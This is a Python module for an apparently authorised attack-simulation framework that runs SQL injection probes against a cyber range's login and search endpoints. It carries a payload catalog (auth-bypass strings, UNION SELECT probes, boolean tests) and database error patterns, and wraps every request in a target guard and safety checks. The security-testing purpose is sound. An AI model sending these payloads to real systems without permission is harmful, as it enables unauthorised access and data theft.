import re
import time
from datetime import datetime
from urllib.parse import urlparse

from Attacks.modules import target_guard
from Attacks.modules.base import AttackResult, BaseRunner, Finding

SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlException",
    r"SQLException",
    r"sqlite3\.OperationalError",
    r"SQLite\.OperationalError",
    r"unrecognized token",
    r"near \".*\":\s*syntax error",
    r"no such column",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"PG::SyntaxError",
    r"syntax error at or near",
]
SQL_ERROR_RE = re.compile("|".join(SQL_ERROR_PATTERNS), re.IGNORECASE)


PAYLOAD_CATALOG = {
    "auth_bypass": [
        "' OR '1'='1' -- ",
        "admin' -- ",
        "' OR 1=1 -- ",
    ],
    "error": [
        "'",
        '"',
        "\\",
    ],
    "union": [
        "' UNION SELECT NULL -- ",
        "' UNION SELECT NULL,NULL -- ",
        "' UNION SELECT NULL,NULL,NULL -- ",
        "' UNION SELECT NULL,NULL,NULL,NULL -- ",
    ],
    "boolean_true": ["' OR '1'='1"],
    "boolean_false": ["' OR '1'='2"],
}

BASELINE_VALUE = "BASELINE_NORMAL_VALUE"


class SqliRunner(BaseRunner):
    module_id = "sqli"
    module_label = "SQL Injection"

    def run(self):
        result = self._new_result()

        try:
            target_guard.assert_permitted(self.target_url, self.target)
        except target_guard.TargetNotPermitted as ex:
            result.mode = "refused"
            result.guidance = f"Target refused by guard: {ex}"
            result.completed_at = datetime.utcnow()
            return result

        endpoints = self._resolve_endpoints()
        if not endpoints:
            result.mode = "refused"
            result.guidance = "No endpoints to test (provide a target URL)."
            result.completed_at = datetime.utcnow()
            return result

        plan = self._build_plan(endpoints)[: self.attempts]
        baselines = {self._endpoint_key(ep): self._fetch_baseline(ep) for ep in endpoints}

        for ep, payload, category in plan:
            if self._runtime_exceeded():
                break

            metadata = {
                "target_url": ep["url"],
                "target_ip": urlparse(ep["url"]).hostname,
                "service": "http",
                "payload": payload,
                "method": ep["method"],
            }
            decision = self._safety_evaluate("payload", metadata)
            verdict = self._record_safety_verdict(decision, result, endpoint=ep["url"])
            if verdict == "blocked":
                continue
            if verdict == "throttled":
                time.sleep(self.min_interval * 2)
                continue
            if verdict == "terminated":
                break

            response, latency_ms, ex = self._issue_request(ep, payload)
            result.latencies_ms.append(latency_ms)
            result.sample_count += 1

            if ex is not None or response is None:
                result.findings.append(Finding(
                    payload=payload,
                    endpoint=ep["url"],
                    method=ep["method"],
                    status=0,
                    latency_ms=latency_ms,
                    success=False,
                    evidence=f"network error: {ex}",
                    category=category,
                ))
                continue

            baseline = baselines.get(self._endpoint_key(ep))
            finding = self._evaluate(response, latency_ms, ep, payload, category, baseline)
            result.findings.append(finding)
            if finding.success:
                result.success_count += 1
                result.status_counts["success"] = result.status_counts.get("success", 0) + 1
            if finding.detection_signal:
                key = finding.detection_signal
                result.status_counts[key] = result.status_counts.get(key, 0) + 1

            detectability = self._detectability(finding)
            result.detectability_scores.append(detectability)
            monitor = self._safety_monitor({
                "detectability_score": detectability,
                "bandwidth_kbps": 1.5,
                "packet_count": 1,
                "unexpected_targets": 0,
            })
            m_verdict = self._record_safety_verdict(monitor, result, endpoint=ep["url"])
            if m_verdict == "throttled":
                time.sleep(self.min_interval * 2)
            elif m_verdict == "terminated":
                break

            time.sleep(self.min_interval)

        result.target_metrics = self._pull_castrange_metrics()
        result.completed_at = datetime.utcnow()
        result.guidance = self._build_guidance(result)
        return result

    # -- planning --------------------------------------------------------

    def _categories_for(self, endpoint_type):
        if endpoint_type == "login":
            return ["auth_bypass", "error"]
        return ["error", "union", "boolean_true", "boolean_false"]

    def _build_plan(self, endpoints):
        plan = []
        # Round-robin across endpoints so a single endpoint can't monopolize attempts
        per_ep_payloads = {}
        for ep in endpoints:
            cats = self._categories_for(ep["type"])
            payloads = []
            for cat in cats:
                for p in PAYLOAD_CATALOG[cat]:
                    payloads.append((p, cat))
            per_ep_payloads[self._endpoint_key(ep)] = payloads
        idx = 0
        active = list(endpoints)
        while active:
            for ep in list(active):
                payloads = per_ep_payloads[self._endpoint_key(ep)]
                if idx >= len(payloads):
                    active.remove(ep)
                    continue
                payload, category = payloads[idx]
                plan.append((ep, payload, category))
            idx += 1
        return plan

    # -- endpoints -------------------------------------------------------

    def _endpoint_key(self, ep):
        return f"{ep['method'].upper()} {ep['url']}"

    def _resolve_endpoints(self):
        explicit = self.target.get("endpoints")
        if isinstance(explicit, list) and explicit:
            return [self._normalize_endpoint(e) for e in explicit]

        if not self.target_url:
            return []

        raw = self.target_url if "://" in self.target_url else "http://" + self.target_url
        parsed = urlparse(raw)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or ""

        if path.endswith("/login"):
            return [{
                "url": f"{base}{path}",
                "method": "POST",
                "params": {"username": "{payload}", "password": "x"},
                "type": "login",
            }]

        if path and path != "/":
            return [{
                "url": f"{base}{path}",
                "method": "GET",
                "params": {"q": "{payload}"},
                "type": "search",
            }]

        return [
            {"url": f"{base}/login", "method": "POST",
             "params": {"username": "{payload}", "password": "x"}, "type": "login"},
            {"url": f"{base}/api/search", "method": "GET",
             "params": {"q": "{payload}"}, "type": "search"},
        ]

    def _normalize_endpoint(self, ep):
        out = dict(ep)
        out.setdefault("method", "GET")
        out.setdefault("type", "generic")
        out.setdefault("params", {})
        return out

    def _interpolate(self, params, payload):
        out = {}
        for k, v in (params or {}).items():
            if isinstance(v, str) and "{payload}" in v:
                out[k] = v.replace("{payload}", payload)
            else:
                out[k] = v
        return out

    # -- HTTP ------------------------------------------------------------

    def _fetch_baseline(self, ep):
        params = self._interpolate(ep.get("params", {}), BASELINE_VALUE)
        try:
            if ep["method"].upper() == "POST":
                r = self.session.post(ep["url"], data=params,
                                      timeout=self.DEFAULT_TIMEOUT, allow_redirects=False)
            else:
                r = self.session.get(ep["url"], params=params,
                                     timeout=self.DEFAULT_TIMEOUT, allow_redirects=False)
            return {"status": r.status_code, "body_len": len(r.text or ""), "body": r.text or ""}
        except Exception:
            return None

    def _issue_request(self, ep, payload):
        params = self._interpolate(ep.get("params", {}), payload)
        start = time.time()
        try:
            if ep["method"].upper() == "POST":
                r = self.session.post(ep["url"], data=params,
                                      timeout=self.DEFAULT_TIMEOUT, allow_redirects=False)
            else:
                r = self.session.get(ep["url"], params=params,
                                     timeout=self.DEFAULT_TIMEOUT, allow_redirects=False)
            return r, int((time.time() - start) * 1000), None
        except Exception as ex:
            return None, int((time.time() - start) * 1000), ex

    # -- evaluation ------------------------------------------------------

    def _evaluate(self, response, latency_ms, ep, payload, category, baseline):
        body = response.text or ""
        status = response.status_code
        success = False
        evidence = ""
        detection = ""

        if status == 403:
            detection = "waf_403"
        elif status == 429:
            detection = "rate_limited_429"

        if ep["type"] == "login" and category == "auth_bypass":
            location = response.headers.get("Location", "") or ""
            if status in (301, 302, 303) and "/dashboard" in location:
                success = True
                evidence = f"{status} redirect to {location} (auth bypass)"

        elif category == "error":
            if SQL_ERROR_RE.search(body):
                success = True
                evidence = "SQL error pattern leaked in response body"

        elif category == "union":
            if status == 200 and baseline and abs(len(body) - baseline["body_len"]) > 100:
                success = True
                evidence = (f"body length delta {len(body) - baseline['body_len']} "
                            f"vs baseline {baseline['body_len']} (union likely succeeded)")

        elif category in ("boolean_true", "boolean_false"):
            evidence = (f"body length {len(body)}; "
                        f"baseline {baseline['body_len'] if baseline else 'n/a'}")

        if not success and category != "error" and SQL_ERROR_RE.search(body):
            success = True
            if evidence:
                evidence += "; "
            evidence += "SQL error pattern leaked (verbose error)"

        return Finding(
            payload=payload,
            endpoint=ep["url"],
            method=ep["method"],
            status=status,
            latency_ms=latency_ms,
            success=success,
            evidence=evidence,
            detection_signal=detection,
            category=category,
        )

    def _detectability(self, finding):
        if finding.detection_signal == "waf_403":
            return 90.0
        if finding.detection_signal == "rate_limited_429":
            return 70.0
        if finding.success and "SQL error" in finding.evidence:
            return 55.0
        if finding.success:
            return 40.0
        return 25.0

    # -- castrange ground truth -----------------------------------------

    def _pull_castrange_metrics(self):
        if not self.target_url:
            return None
        meta = self.target.get("metadata") or {}
        token = meta.get("range_token")
        if not token:
            try:
                with open("castrange.token", "r", encoding="utf-8") as f:
                    token = f.read().strip()
            except OSError:
                return None
        if not token:
            return None
        raw = self.target_url if "://" in self.target_url else "http://" + self.target_url
        parsed = urlparse(raw)
        base = f"{parsed.scheme}://{parsed.netloc}"
        try:
            r = self.session.get(f"{base}/_range/metrics", params={"token": token},
                                 timeout=self.DEFAULT_TIMEOUT)
            if r.status_code == 200:
                return r.json()
        except Exception:
            return None
        return None

    # -- guidance --------------------------------------------------------

    def _build_guidance(self, result: AttackResult):
        if result.mode == "refused":
            return result.guidance
        if result.status_counts.get("terminated"):
            return "SQLi run terminated by safety monitoring."
        if result.sample_count == 0:
            return "No SQLi attempts were sent (all blocked or filtered out before request)."
        rate = result.success_rate_percent
        det = result.detection_rate_observed_percent
        if result.success_count == 0 and det > 50:
            return (f"No SQLi findings ({rate}%); high observed detection ({det}%). "
                    "Target appears to be behind a WAF or rate limiter.")
        if result.success_count == 0:
            return f"No SQLi findings on this run ({result.sample_count} attempts)."
        if det > 50:
            return (f"SQLi findings: {result.success_count}/{result.sample_count} ({rate}%); "
                    f"observed detection {det}%. Defenses are catching some but not all attempts.")
        if rate > 50:
            return (f"SQLi findings: {result.success_count}/{result.sample_count} ({rate}%); "
                    "target appears highly vulnerable.")
        return (f"SQLi findings: {result.success_count}/{result.sample_count} ({rate}%); "
                f"observed detection {det}%.")
